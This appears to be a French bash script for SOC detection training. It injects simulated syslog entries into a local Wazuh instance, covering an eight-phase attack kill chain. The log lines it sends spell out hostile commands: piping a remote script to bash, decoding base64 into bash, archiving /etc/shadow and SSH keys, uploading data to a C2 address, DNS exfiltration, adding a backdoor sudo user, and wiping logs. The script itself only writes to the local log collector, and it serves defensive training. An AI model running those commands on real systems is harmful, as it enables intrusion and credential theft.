#!/bin/bash

# ============================================================
#  SIMULATION — Full Red Team (Niveau 4 — Test Final)
#  Kill chain complète : niveaux 1 → 4
# ============================================================
#
#  ATTENTION : C'est le test final de validation du SOC.
#  Ne lis pas ce script avant de le lancer.
#  Lance-le et réponds à toutes les menaces en < 15 minutes.
#
#  Si tu lis ce script avant, tu triches — et ton SOC est faux.
# ============================================================

WAZUH_IP="127.0.0.1"
SYSLOG_PORT="514"
ATTACKER_IP="192.168.100.50"
C2_IP="185.220.101.45"
C2_DOMAIN="exfil.c2.io"
HOST1="server-prod-01"
HOST2="apt-host-42"
HOST3="srv-db-01"
BACKDOOR_USER="svc_monitor"

RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
NC='\033[0m'

send_syslog() {
    local host="$1"; shift
    local date
    date=$(date '+%b %d %H:%M:%S')
    printf "<36>%s %s %s\n" "$date" "$host" "$1" | nc -u -w1 "$WAZUH_IP" "$SYSLOG_PORT" 2>/dev/null || \
    printf "<36>%s %s %s\n" "$date" "$host" "$1" | nc -w1 "$WAZUH_IP" "$SYSLOG_PORT" 2>/dev/null
}

echo ""
echo "============================================================"
echo -e "  ${RED}[RED TEAM] Exercice Final — Kill Chain Complète${NC}"
echo "============================================================"
echo ""
echo -e "  ${YELLOW}Chrono démarré.${NC} Tu as 15 minutes."
echo ""

START=$(date +%s)

# ---- PHASE 1 : Initial Access --------------------------------
echo -e "${RED}[T+0s]${NC} Phase 1 — Initial Access"
for i in $(seq 1 6); do
    send_syslog "$HOST1" "sshd[9${i}00]: Failed password for root from $ATTACKER_IP port $((50000+i)) ssh2"
    sleep 0.3
done
send_syslog "$HOST1" "sshd[9010]: Accepted password for root from $ATTACKER_IP port 50099 ssh2"
sleep 2

# ---- PHASE 2 : Execution -------------------------------------
echo -e "${RED}[T+$(( $(date +%s) - START ))s]${NC} Phase 2 — Execution (LotL)"
send_syslog "$HOST1" "bash[9020]: curl -s -L http://$C2_IP/stage1.sh | bash"
send_syslog "$HOST1" "bash[9021]: echo 'aW5zdGFsbCBiYWNrZG9vcgo=' | base64 -d | bash"
sleep 2

# ---- PHASE 3 : Persistence -----------------------------------
echo -e "${RED}[T+$(( $(date +%s) - START ))s]${NC} Phase 3 — Persistence"
send_syslog "$HOST1" "ossec: File '/etc/crontab' modified. Owner: root. Mode: 644."
send_syslog "$HOST1" "useradd[9030]: new user: name=$BACKDOOR_USER, UID=1337, GID=1337"
send_syslog "$HOST1" "usermod[9031]: add '$BACKDOOR_USER' to group 'sudo'"
send_syslog "$HOST1" "ossec: New file '/home/$BACKDOOR_USER/.ssh/authorized_keys' added."
sleep 2

# ---- PHASE 4 : Privilege Escalation --------------------------
echo -e "${RED}[T+$(( $(date +%s) - START ))s]${NC} Phase 4 — Privilege Escalation"
send_syslog "$HOST1" "ossec: File '/tmp/.hidden/bash' modified. Permissions changed: 755 -> 4755"
send_syslog "$HOST1" "sudo: $BACKDOOR_USER : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash"
sleep 2

# ---- PHASE 5 : Defense Evasion ------------------------------
echo -e "${RED}[T+$(( $(date +%s) - START ))s]${NC} Phase 5 — Defense Evasion (log tampering)"
send_syslog "$HOST1" "ossec: File '/var/log/auth.log' modified. Size changed: 45231 -> 0."
send_syslog "$HOST1" "ossec: File '/root/.bash_history' modified. Size changed: 3421 -> 0."
sleep 2

# ---- PHASE 6 : Lateral Movement -----------------------------
echo -e "${RED}[T+$(( $(date +%s) - START ))s]${NC} Phase 6 — Lateral Movement"
send_syslog "$HOST2" "sshd[9050]: Accepted publickey for root from 10.0.0.1 port 48001 ssh2"
send_syslog "$HOST3" "sshd[9051]: Accepted publickey for root from 10.0.0.42 port 48101 ssh2"
send_syslog "$HOST3" "bash[9052]: mysqldump -u root -p'pass' --all-databases > /tmp/.dump.sql"
sleep 2

# ---- PHASE 7 : C2 Beaconing ---------------------------------
echo -e "${RED}[T+$(( $(date +%s) - START ))s]${NC} Phase 7 — C2 Beaconing"
for i in $(seq 1 5); do
    send_syslog "$HOST2" "curl[905$i]: GET /api/v1/tasks HTTP/1.1 Host: update-cdn.net"
    sleep 1
done

# ---- PHASE 8 : Exfiltration ---------------------------------
echo -e "${RED}[T+$(( $(date +%s) - START ))s]${NC} Phase 8 — Exfiltration"
send_syslog "$HOST2" "bash[9060]: tar czf /tmp/.loot.tgz /etc/shadow /home /root/.ssh"
send_syslog "$HOST2" "curl[9061]: POST http://$C2_IP/upload Content-Length: 10485760"
send_syslog "$HOST2" "named[9062]: query: $(date +%s | base64 | head -c 32).dump.$C2_DOMAIN IN A"
sleep 1

TOTAL=$(( $(date +%s) - START ))

echo ""
echo "============================================================"
echo -e "  ${GREEN}Kill chain complète injectée en ${TOTAL}s${NC}"
echo "============================================================"
echo ""
echo -e "  ${YELLOW}Maintenant tu as 15 minutes pour :${NC}"
echo ""
echo "  1. Identifier toutes les phases dans Wazuh"
echo "  2. Construire la timeline complète"
echo "  3. Déclencher le blocage de $ATTACKER_IP et $C2_IP"
echo "  4. Identifier les 3 hosts compromis"
echo "  5. Produire un rapport d'incident"
echo ""
echo -e "  ${CYAN}Phases à détecter :${NC}"
echo "  T1110 Brute Force → T1059 Execution → T1136 Persistence"
echo "  → T1548 PrivEsc → T1070 Defense Evasion → T1021 Lateral"
echo "  → T1071 C2 → T1041 Exfiltration"
echo ""
echo -e "  ${RED}Score : 1 phase manquée = -10 points${NC}"
echo ""
